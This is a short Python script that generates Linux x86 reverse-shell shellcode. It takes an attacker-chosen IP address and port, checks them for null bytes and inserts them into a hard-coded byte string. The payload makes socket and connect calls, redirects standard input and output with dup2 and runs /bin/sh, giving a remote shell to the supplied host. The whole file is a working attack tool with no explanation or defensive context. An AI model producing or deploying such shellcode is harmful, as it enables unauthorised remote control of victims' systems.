#!/usr/bin/env python3
import sys
import struct
import socket


port = int(sys.argv[2])
IP = sys.argv[1]

if port > 65535 :
    print("port cannot exceed 65535")
    exit()


port = struct.pack("!H", port)

port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))

if "\\x00" in port:
    print(" warning : NULL  byte detected! choose different port and rerun")
    exit()

ip_final = socket.inet_aton(IP)
ip_final = str(ip_final) 
ip_final = ip_final[2:]
ip_final = ip_final[:-1]


if "\\x00" in ip_final:
    print(" warning : NULL  byte detected! choose different port and rerun")
    exit()    

finalshellcode = """\\x31\\xd2\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58\\x6a\\x03\\x5b\\x68%s\\x66\\x68%s\\x66\\x6a\\x02\\x89\\xe7\\x6a\\x10\\x57\\x56\\x89\\xe1\\xcd\\x80\\x89\\xf3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80""" % (ip_final,port)


print("shellcode : ",finalshellcode)
